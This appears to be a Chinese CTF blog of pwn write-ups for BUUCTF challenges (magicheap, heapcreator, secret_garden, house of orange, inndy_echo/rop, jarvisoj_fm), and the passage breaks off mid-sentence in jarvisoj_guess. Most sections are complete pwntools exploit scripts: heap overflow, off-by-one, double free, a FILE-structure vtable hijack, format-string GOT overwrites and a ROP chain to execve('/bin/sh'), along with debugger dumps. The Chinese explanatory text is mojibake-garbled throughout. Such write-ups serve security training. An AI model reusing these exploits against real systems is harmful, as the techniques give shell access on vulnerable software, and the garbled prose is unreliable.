+ 4, 8uLL); v2 = atoi((const char *)&amp;v1 + 4); printf(&quot;Content of heap : &quot;, (char *)&amp;v1 + 4, v1); read_input(heaparray[(signed int)v1], v2); return puts(&quot;Done !&quot;); æœªæ§åˆ¶è¾¹å †æº¢å‡º 3.EXP 123456789101112131415161718192021222324252627282930313233343536from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./magicheap&quot;)libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)p = process(&quot;./magicheap&quot;)#p = remote(&quot;node3.buuoj.cn&quot;,&quot;25535&quot;)def add(sz,text): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text)def edit(idx,text): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(len(text))) p.sendlineafter(&quot;:&quot;,str(text))def free(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx))l33t = 0x6020A0if __name__ == &#x27;__main__&#x27;: add(0x60,&#x27;aaaa&#x27;) add(0x60,&#x27;aaaa&#x27;) add(0x60,&#x27;aaaa&#x27;) free(2) edit(1,&#x27;a&#x27;*0x60+p64(0)+p64(0x71)+p64(l33t-0x13)) #&lt;--æ§åˆ¶bkæŒ‡é’ˆ add(0x60,&#x27;aaaa&#x27;) #2 add(0x60,&#x27;aaaa&#x27;) #3 fake_chunk edit(3,&#x27;a&#x27;*8) p.sendlineafter(&quot;:&quot;,str(0x1305)) p.interactive() ä¸ºä»€ä¹ˆæ˜¯p64(l33t-0x13)ï¼Ÿ ç»è¿‡åŠ¨æ€è°ƒè¯•å¾—è¯¥å¤„æ˜¯unsorted biné“¾è¡¨ ä¸ºä»€ä¹ˆedit(3,â€˜aâ€™*8)ï¼Ÿ è¦†å†™magicçš„å€¼ä¸ºâ€˜0x6161616161616161ä»è€Œè¿›å…¥åé—¨ hitcontraining_heapcreator Off_By_One 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA æ—¥å¸¸å¢åˆ æŸ¥æ”¹ 1234def add(size,content): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(size)) p.sendlineafter(&quot;:&quot;,content) 1234def edit(idx,content): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,content) 123def show(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) 123def delete(idx): p.sendlineaftr(&quot;:&quot;,&quot;4&quot;) p.sendline(&quot;:&quot;,str(idx)) edit 123printf(&quot;Content of heap : &quot;, &amp;buf); read_input(*((_QWORD *)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL); puts(&quot;Done !&quot;); äººä¸ºçš„å¤šè¯»å–äº†ä¸€ä¸ªå­—èŠ‚(off by oneä½¿å¾—æˆ‘ä»¬å¯ä»¥æ§åˆ¶ä¸‹ä¸€ä¸ªchunkçš„size,å†å¾—åˆ°`libc base æœ€åæ”¹freeä¸ºsystem 3.EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./heapcreator&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#p = process(&quot;./heapcreator&quot;)p = remote(&quot;node3.buuoj.cn&quot;,29082)def add(size,content): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(size)) p.sendlineafter(&quot;:&quot;,content)def edit(idx,content): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,content)def show(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx))def delete(idx): p.sendlineaftr(&quot;:&quot;,&quot;4&quot;) p.sendline(&quot;:&quot;,str(idx))if __name__ == &#x27;__main__&#x27;: add(0x18,&#x27;aaaa&#x27;) add(0x18,&#x27;aaaa&#x27;) #gdb.attach(p) edit(0,&#x27;/bin/sh\\x00&#x27;+&#x27;a&#x27;*0x10+&#x27;\\x41&#x27;) #&lt;-off by one #gdb.attach(p) delete(1) #gdb.attach(p) add(0x30,p64(0)*4+p64(0x30)+p64(elf.got[&quot;free&quot;])) #gdb.attach(p) show(1) leak=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;)) base=leak-libc.sym[&quot;free&quot;] sys_addr = base+libc.sym[&quot;system&quot;] log.success(&quot;leak addr=&gt;0x%x&quot;,leak) log.success(&quot;libc base=&gt;0x%x&quot;,base) log.success(&quot;system addr=&gt;0x%x&quot;,sys_addr) edit(1,p64(sys_addr)) delete(0) p.interactive() hitcontraining_secret_garden Double_Free 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA åŸæ¥çš„èœå•æœ‰å¾ˆå¤šæ— ç”¨çš„å‡½æœ‰ç”¨çš„å°±ä¸¤ä¸ª 12345def create(lenght,name,color): p.sendlineafter(&quot;:&quot;,&#x27;1&#x27;) p.sendlineafter(&quot;:&quot;,str(lenght)) p.sendlineafter(&quot;:&quot;,name) p.sendlineafter(&quot;:&quot;,color) 123def delete(idx): p.sendlineafter(&quot;:&quot;,&#x27;3&#x27;) p.sendlineafter(&quot;:&quot;,str(idx)) back_door 1234int magic()&#123; return system(&quot;/bin/sh&quot;);&#125; 3.EXP åŸç‰ˆEXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *host = &quot;training.pwnable.tw&quot;port = 11012#r = remote(host,port)r = process(&quot;./secretgarden&quot;)def raiseflower(length,name,color): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(length)) r.recvuntil(&quot;:&quot;) r.sendline(name) r.recvuntil(&quot;:&quot;) r.sendline(color)def visit(): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;)def remove(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def clean(): r.recvuntil(&quot;:&quot;) r.sendline(&quot;4&quot;)magic = 0x400c7bfake_chunk = 0x601ffaraiseflower(0x50,&quot;da&quot;,&quot;red&quot;)raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)remove(0)remove(1)remove(0)raiseflower(0x50,p64(fake_chunk),&quot;blue&quot;)raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)raiseflower(0x50,&quot;a&quot;*6 + p64(0) + p64(magic)*2 ,&quot;red&quot;)r.interactive() houseoforange_hitcon_2016 checksec 123456Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledFORTIFY: Enabled ä¿æŠ¤å…¨å¼€ IDA 123puts(&quot; 1. Build the house &quot;);puts(&quot; 2. See the house &quot;);puts(&quot; 3. Upgrade the house &quot;); æ²¡æœ‰ free ç›¸å…³å‡½æ•° build 12345if ( unk_203070 &gt; 3u ) &#123; puts(&quot;Too many house&quot;); exit(1); &#125; æœ€å¤šåªèƒ½æœ‰3ä¸ªæ©˜å­ 1234567891011v3 = malloc(0x10uLL); // å­˜å‚¨houseå¤§å°printf(&quot;Length of name :&quot;);size = made_choice();if ( size &gt; 0x1000 ) size = 0x1000;v3[1] = malloc(size);if ( !v3[1] )&#123; puts(&quot;Malloc error !!!&quot;); exit(1);&#125; æœ€å¤šå¯ä»¥ç”³è¯· 0x1000å¤§å°çš„chunk 12345678910111213141516printf(&quot;Color of Orange:&quot;); size_4 = made_choice(); if ( size_4 != 0xDDAA &amp;&amp; (size_4 &lt;= 0 || size_4 &gt; 7) ) &#123; puts(&quot;No such color&quot;); exit(1); &#125; if ( size_4 == 0xDDAA ) v4[1] = 0xDDAA; else v4[1] = size_4 + 30; *(_QWORD *)v3 = v4; house_idx = v3; ++unk_203070; return puts(&quot;Finish&quot;);&#125; å‘ç° color å¯ä»¥å˜ä¸ºï¼ˆ1&lt;x&lt;=7ï¼‰|| x=0xDDAAï¼Œè¿™é‡Œå¯èƒ½æ˜¯çªç ´å£ upgrade 12if ( unk_203074 &gt; 2u ) return puts(&quot;You can&#x27;t upgrade more&quot;); åªèƒ½ä½¿ç”¨ä¸¤æ¬¡ 1234567891011121314151617181920212223printf(&quot;Length of name :&quot;);v2 = made_choice();if ( v2 &gt; 0x1000 ) v2 = 0x1000;printf(&quot;Name:&quot;);safe_read((void *)house_name[1], v2);printf(&quot;Price of Orange: &quot;, v2);v1 = (_DWORD *)*house_name;*v1 = made_choice();colorful(); printf(&quot;Color of Orange: &quot;);v3 = made_choice();if ( v3 != 0xDDAA &amp;&amp; (v3 &lt;= 0 || v3 &gt; 7) )&#123; puts(&quot;No such color&quot;); exit(1);&#125;if ( v3 == 0xDDAA ) *(_DWORD *)(*house_name + 4LL) = 0xDDAA;else *(_DWORD *)(*house_name + 4LL) = v3 + 30;++unk_203074;return puts(&quot;Finish&quot;); åŒæ ·å¯ä»¥ç”³è¯· 0x1000å¤§å°çš„chunkä¹‹ç±»çš„æ“ä½œï¼Œå¯ä»¥å †æº¢å‡º æ€è·¯ 1.ä¿®æ”¹top_chunkçš„size 2.è§¦å‘sysmallocä¸­çš„_int_free 3.æ³„éœ²libcå’Œheapçš„åœ°å€ 4.è§¦å‘å¼‚å¸¸ gdb 0x1 ä¿®æ”¹top_chunkçš„size ç”³è¯·ä¸€ä¸ªhouseï¼Œç»“æ„ä¸º 1234567891011121314#codeadd(0x30,&#x27;a&#x27;*8)#gdbgefâ¤ x/32gx 0x5565938710000x556593871000: 0x0000000000000000 0x00000000000000210x556593871010: 0x0000556593871070 0x00005565938710300x556593871020: 0x0000000000000000 0x00000000000000410x556593871030: 0x0000000a61616161 0x00000000000000000x556593871040: 0x0000000000000000 0x00000000000000000x556593871050: 0x0000000000000000 0x00000000000000000x556593871060: 0x0000000000000000 0x00000000000000210x556593871070: 0x000000210000000a 0x00000000000000000x556593871080: 0x0000000000000000 0x0000000000020f81ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ è¦†ç›–æ‰ top chunk sizeåŸŸçš„payloadä¸º payload = 'a'*0x30+p64(0)+p64(0x21)+'a'*0x10+p64(0)+p64(0xf81) è¿™æ ·å°±å°† top_chunk-&gt;szie = 0x1fc0 1234567890x56222cc84000: 0x0000000000000000 0x00000000000000210x56222cc84010: 0x000056222cc84070 0x000056222cc840300x56222cc84020: 0x0000000000000000 0x00000000000000410x56222cc84030: 0x6161616161616161 0x6161616161616161.............. .................. ..................0x56222cc84060: 0x0000000000000000 0x00000000000000210x56222cc84070: 0x0000002100000006 0x61616161616161610x56222cc84080: 0x0000000000000000 0x0000000000000f810x56222cc84090: 0x0000000000000000 0x0000000000000000 ä¿®æ”¹æˆåŠŸ 0x2 è§¦å‘sysmallocä¸­çš„_int_free æˆåŠŸä¿®æ”¹ top chunk,ä¸‹ä¸€æ­¥åªè¦æˆ‘ä»¬ç”³è¯·ä¸€å— topchunk å¤§å°ä¸æ»¡è¶³çš„chunkå³å¯ï¼Œç”±ä¹‹å‰çš„åˆ†æå¯çŸ¥æˆ‘ä»¬æœ€å¤§å¯ä»¥ç”³è¯· 0x1000 çš„ç©ºé—´ï¼Œé‚£ä¹ˆ add(0x1000,'b'*8) 12345678Chunk(addr=0x564081bf1010, size=0x20, flags=PREV_INUSE)Chunk(addr=0x564081bf1030, size=0x40, flags=PREV_INUSE)Chunk(addr=0x564081bf1070, size=0x20, flags=PREV_INUSE)Chunk(addr=0x564081bf1090, size=0x20, flags=PREV_INUSE)Chunk(addr=0x564081bf10b0, size=0x20, flags=PREV_INUSE)Chunk(addr=0x564081bf10d0, size=0xf20, flags=PREV_INUSE)Chunk(addr=0x564081bf1ff0, size=0x10, flags=)Chunk(addr=0x564081bf2000, size=0x10, flags=PREV_INUSE) top_chunkæ¶ˆå¤±äº† 123[+] unsorted_bins[0]: fw=0x564081bf10c0, bk=0x564081bf10c0 â†’ Chunk(addr=0x564081bf10d0, size=0xf20, flags=PREV_INUSE)[+] Found 1 chunks in unsorted bin. æˆåŠŸåŠ å…¥ unsroted bins ,ç›¸å½“äº free æ‰äº†top chunk 0x3 æ³„éœ²libcå’Œheapçš„åœ°å€ ä¸‹ä» unsorted bins ä¸­å–å‡ºä¸€ç‚¹ä¸‹æ¥ç”¨ å› ä¸ºåŸæ¥æœ‰è¾“å‡ºçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨å®ƒè¾“å‡ºåˆšæ‰çš„é‚£ä¸ªchunk 1234567891011121314151617181920212223#code: add(0x400,&#x27;c&#x27;*8) see() leak = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;)) log.success(&quot;leak add =&gt; 0x%x&quot;,leak) gdb.attach(p)#è¾“å‡º[+] leak add =&gt; 0x7f5cf839a10a#gdb0x5584c45e30e0 PREV_INUSE &#123; prev_size = 0, size = 1041, fd = 0x6363636363636363, bk = 0x7f5cf839a10a &lt;main_arena+1514&gt;, fd_nextsize = 0x5584c45e30e0, bk_nextsize = 0x5584c45e30e0&#125;vmmap 0x5584c45e3000 0x5584c4626000 rw-p 43000 0 [heap] 0x7f5cf7fd5000 0x7f5cf8195000 r-xp 1c0000 0 /lib/x86_64-linux-gnu/libc-2.23.so 0x7f5cf8195000 0x7f5cf8395000 ---p 200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7f5cf8395000 0x7f5cf8399000 r--p 4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7f5cf8399000 0x7f5cf839b000 rw-p 2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so å¦‚æœçŸ¥é“æ˜¯çŸ¥é“libc2.23çš„è¯ 12&gt;&gt;&gt; hex(0x7f5cf839a10a-0x7f5cf7fd5000-1514)&#x27;0x3c4b20&#x27; ä¸çŸ¥é“çš„è¯ç›´æ¥åŠ å‡ 12&gt;&gt;&gt; hex(0x7f5cf839a10a-0x7f5cf7fd5000)&#x27;0x3c510a&#x27; åŒç†å¯çŸ¥ heap_base å¼€å§‹æ³„éœ²ï¼Œä½†æ˜¯è¦æ³„éœ²ä»€ä¹ˆï¼Ÿè¿™é‡Œæ³„éœ²çš„ä¸œè¥¿å°±å†³å®šäº†æˆ‘ä»¬æ”»å‡»çš„æ–¹å¼ è¿™é“é¢˜ä¿æŠ¤å…¨å¼€ï¼Œä¹‹å‰çš„æ–¹æ³•å¥½åƒä¸å¤ªè¡Œï¼Œæƒ³èµ·ä¹‹å‰çš„æ–‡ç« FILEç»“æ„ é‚£æˆ‘ä»¬å¯ä»¥ä¼ªé€ å‡ºä¸€ä¸ªfileï¼Œé€šè¿‡ä¿®æ”¹ vtable æŒ‡é’ˆæ¥è°ƒç”¨ systemé‚£ä¹ˆå°±éœ€è¦ 12345libc_base = leak-0x3c510asystem_addr = libc_base+libc.sym[&quot;system&quot;]binsh = libc_base+libc.search(&quot;/bin/sh\\x00&quot;).next()IO_list_all = libc_base+libc.sym[&quot;_IO_list_all&quot;]IO_str_jumps = libc.symbols[&quot;_IO_file_jumps&quot;]+0xc0+libc_base 0x4 å¼€å§‹æ„é€  fake file ptr_vtableæŒ‡å‘ä¼ªé€ çš„vtableå¤„ï¼Œvtable[3]ä¸ºIO_overflowå‡½æ•°åœ°å€ï¼Œå°†vtable[3]ä¼ªé€ ä¸ºsystemåœ°å€ï¼Œ å¦‚æœå†è¿›å…¥build_houseå‡½æ•°ï¼Œè¿›è¡Œmalloc(0x10)ï¼Œç”±äº0x10&lt;=2*SIZE_SZï¼Œå°±ä¼šè§¦å‘malloc_printerrï¼Œä¼šéå†IO_llist_allï¼Œé€šè¿‡chainæ‰¾åˆ°æœ€ç»ˆä¼ªé€ çš„åœ¨old top chunkå¤„çš„_IO_FILEï¼Œç„¶åæ‰¾åˆ°vtableï¼Œæœ€ç»ˆè°ƒç”¨ IO_overflowå‡½æ•° è°ƒç”¨IO_overflowæ—¶ä¼šä¼ å…¥_IO_FILEç»“æ„æŒ‡é’ˆä½œä¸ºå‚æ•°ï¼Œå°†old top chunkå¤„ä¼ªé€ çš„_IO_FILEçš„å‰å‡ ä¸ªå­—èŠ‚ä¿®æ”¹ä¸º/bin/sh\\x00 å³æœ€ç»ˆè°ƒç”¨ä¸ºsystem(â€˜/bin/shâ€™) 2016 ctf-HITCONâ€”â€”houseoforange FILEç»“æ„ 12345678910111213141516171819202122232425262728293031323334353637struct _IO_FILE&#123; int _flags; /* é«˜é˜¶ç‰ˆæœ¬ä¹Ÿå«ä½œ _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ char *_IO_read_ptr; /* Current read pointer */ char *_IO_read_end; /* End of get area. */ char *_IO_read_base; /* Start of putback+get area. */ //read char *_IO_write_base; /* Start of put area. */ char *_IO_write_ptr; /* Current put pointer. */ char *_IO_write_end; /* End of put area. */ //write char *_IO_buf_base; /* Start of reserve area. */ char *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain;//é€šè¿‡è¿™ä¸ªåŸŸåˆ›é€ é“¾è¡¨ int _fileno; int _flags2; __off_t _old_offset; /* This used to be _offset but it&#x27;s too small. */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; åç§»0x20å¤„ä¸ºIO_write_base,åç§»0x28å¤„ä¸ºIO_write_ptr,åç§»0xc8å¤„ä¸º_mode,åç§»0xd8å¤„ä¸ºptr_vtable ç»•è¿‡æ£€æµ‹ï¼š 1._mode&lt;=0 2._IO_write_base&lt;IO_write_ptr æœ€ç»ˆçš„ç»“æ„ä½“ 12345678910111213141516payload = &quot;a&quot;*0x400payload += p64(0)+p64(0x21)+&#x27;a&#x27;*0x10fake_file = p64(0)+p64(0x60)#åˆ©ç”¨unsorted bin attackå°† _IO_list_allä¿®æ”¹ä¸ºmain_arena+0x58(å³&amp;unsorted_bin+0x10)fake_file += p64(0)+p64(IO_list_all-0x10)fake_file += p64(0)+p64(1)fake_file += p64(0)+p64(binsh)fake_file = fake_file.ljust(0xc0,&#x27;\\x00&#x27;)payload += fake_filepayload += p64(0)*3payload += p64(IO_str_jumps-0x8)payload += p64(0)payload += p64(system_addr) #jump2here 12345678unsortedbinall [corrupted]FD: 0x55b6afcad510 â—‚â€” 0x0BK: 0x55b6afcad510 â€”â–¸ 0x7f0850d77510 â—‚â€” 0x0pwndbg&gt; x/12gx 0x7f0850d775100x7f0850d77510: 0x0000000000000000 0x00000000000000000x7f0850d77520 &lt;_IO_list_all&gt;: 0x00007f0850d77540 0x00000000000000000x7f0850d77530: 0x0000000000000000 0x0000000000000000 å·²ç»è¿ç§»IO_list_all EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980# -*- coding: utf-8 -*- from pwn import *#context.log_level =&quot;debug&quot;elf = ELF(&quot;./houseoforange_hitcon_2016&quot;)libc = ELF(&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.23.so&quot;)p = 0def connect(ip,port,mode): global p if mode == 1: p = process(&quot;./houseoforange_hitcon_2016&quot;) else: p = remote(ip,port)def add(sz,name): p.sendlineafter(&quot;: &quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,name) p.sendlineafter(&quot;:&quot;,&quot;10&quot;) p.sendlineafter(&quot;:&quot;,&quot;3&quot;)def see(): p.sendlineafter(&quot;: &quot;,&quot;2&quot;)def edit(sz,text): p.sendlineafter(&quot;: &quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text) p.sendlineafter(&quot;:&quot;,&quot;3&quot;)def pwn():#------------House_of_orange------------ add(0x30,&#x27;a&#x27;*8) payload = &#x27;a&#x27;*0x30+p64(0)+p64(0x21)+&#x27;a&#x27;*0x10+p64(0)+p64(0xf81) edit(len(payload),payload) add(0x1000,&#x27;b&#x27;) add(0x400,&#x27;c&#x27;*8) see() leak = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;)) log.success(&quot;leak add =&gt; 0x%x&quot;,leak)#------------Unsoted_bin leak------------ libc_base = leak-0x3c510a system_addr = libc_base+libc.sym[&quot;system&quot;] binsh = libc_base+libc.search(&quot;/bin/sh\\x00&quot;).next() IO_list_all = libc_base+libc.sym[&quot;_IO_list_all&quot;] IO_str_jumps = libc.symbols[&quot;_IO_file_jumps&quot;]+0xc0+libc_base log.success(&quot;libc base =&gt; 0x%x&quot;,libc_base) log.success(&quot;system addr =&gt; 0x%x&quot;,system_addr) log.success(&quot;IO list all =&gt; 0x%x&quot;,IO_list_all) log.success(&quot;IO str jump =&gt; 0x%x&quot;,IO_str_jumps)#------------Fake FILE------------ payload = &quot;a&quot;*0x400 payload += p64(0)+p64(0x21)+&#x27;a&#x27;*0x10 fake_file = p64(0)+p64(0x60) #åˆ©ç”¨unsorted bin attackå°† _IO_list_allä¿®æ”¹ä¸ºmain_arena+0x58(å³&amp;unsorted_bin+0x10) fake_file += p64(0)+p64(IO_list_all-0x10) fake_file += p64(0)+p64(1) fake_file += p64(0)+p64(binsh) fake_file = fake_file.ljust(0xc0,&#x27;\\x00&#x27;) payload += fake_file payload += p64(0)*3 payload += p64(IO_str_jumps-0x8) payload += p64(0) payload += p64(system_addr) #jump2here edit(0x800,payload) p.recv() p.sendline(&quot;1&quot;) p.sendline(&quot;1&quot;) p.interactive()if __name__ == &#x27;__main__&#x27;: connect(&quot;node3.buuoj.cn&quot;,29891,1) pwn() inndy_echo 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 1234567891011121314151617int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; char s; // [esp+Ch] [ebp-10Ch] unsigned int v4; // [esp+10Ch] [ebp-Ch] v4 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); do &#123; fgets(&amp;s, 0x100, stdin); printf(&amp;s); &#125; while ( strcmp(&amp;s, &quot;exit\\n&quot;) ); system(&quot;echo Goodbye&quot;); exit(0);&#125; å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´ï¼Œæ²¡æœ‰æ ˆæº¢å‡ºï¼Œåˆ©ç”¨ä»»æ„åœ°å€å†™æŠŠprintf@gotæ”¹ä¸ºsystem@plt 3.EXP 12345678910111213from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./echo&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;29921&quot;)printf_got_addr = elf.got[&quot;printf&quot;]system_plt_addr = elf.plt[&quot;system&quot;]payload = fmtstr_payload(7,&#123;printf_got_addr: system_plt_addr&#125;)p.sendline(payload)p.sendline(&quot;$0&quot;)p.interactive() inndy_rop 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA overflow 123456int overflow()&#123; char v1; // [esp+Ch] [ebp-Ch] return gets(&amp;v1);&#125; å‡½æ•°å¤æ‚ï¼Œæœ‰æº¢å‡ºï¼Œç›´æ¥è‡ªåŠ¨ç”Ÿæˆropchain 3.EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *from struct import packcontext.log_level = &quot;debug&quot;#q = process(&#x27;./rop&#x27;)q = remote(&quot;node3.buuoj.cn&quot;,&quot;28171&quot;)context.log_level = &#x27;debug&#x27;def payload(): p = &#x27;a&#x27;*0xc + &#x27;bbbb&#x27; p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; ret p += &#x27;/bin&#x27; p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4 p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; ret p += &#x27;//sh&#x27; p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8 p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; ret p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data p += pack(&#x27;&lt;I&#x27;, 0x080de769) # pop ecx ; ret p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8 p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8 p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0806c943) # int 0x80 return pshell = payload()q.sendline(shell)q.interactive() jarvisoj_fm 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 123456789101112131415161718int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [esp+2Ch] [ebp-5Ch] unsigned int v5; // [esp+7Ch] [ebp-Ch] v5 = __readgsdword(0x14u); be_nice_to_people(); memset(&amp;buf, 0, 0x50u); read(0, &amp;buf, 0x50u); printf(&amp;buf); printf(&quot;%d!\\n&quot;, x); if ( x == 4 ) &#123; puts(&quot;running sh...&quot;); system(&quot;/bin/sh&quot;); &#125; return 0;&#125; åˆ©ç”¨å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´æ”¹xä¸º4 3.EXP 123456789from pwn import *context.log_level = &quot;debug&quot;#p = remote(&quot;node3.buuoj.cn&quot;,26472)p = process(&quot;./fm&quot;)elf = ELF(&quot;./fm&quot;)x_addr = 0x0804A02Cpayload = p32(x_addr)+&quot;%11$n&quot;p.sendline(payload)p.interactive() jarvisoj_guess SocketåŸç†è®²è§£ ä¸‹æ ‡è¶Šç•Œå¯¼è‡´ç›²æ³¨ 1.checksec 12345Arch: amd64-64-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA is_flag_correct 123456789101112131415161718 qmemcpy(bin_by_hex, &amp;unk_401100, sizeof(bin_by_hex)); qmemcpy(flag, &quot;FAKE&#123;9b355e394d2070ebd0df195d8b234509cc29272bc412&#125;&quot;, sizeof(flag)); bzero(given_flag, 0x32uLL); for ( i = 0; i &lt;= 0x31; ++i ) &#123; value1 = bin_by_hex[flag_hex[2 * i]]; value2 = bin_by_hex[flag_hex[2 * i + 1]]; if ( value1 == -1 || value2 == -1 ) &#123; puts(&quot;bad input â€“ one of the characters you supplied was not a valid hex character!&quot;); exit(0); &#125; given_flag[i] = value2 | 16 * value1; &#125; diff = 0; for ( i_0 = 0; i_0 &lt;= 49; ++i_0 ) diff |= flag[i_0] ^ given_flag[i_0]; return diff == 0; å…¶ä¸­ flag æ˜¯ä¹‹å‰ qmemcpyè¿‡åçš„ï¼Œgiven_flagæ˜¯é€šè¿‡ value_1 å’Œ value_2 çš„å€¼è®¡ç®—æ¥çš„ï¼Œè€Œè¿™ä¸¤ä¸ªå€¼æ˜¯ç”±æˆ‘ä»¬è¾“å…¥çš„flagå†³å®šï¼Œå¦‚æœæ§åˆ¶ flag_hex[2 * i] 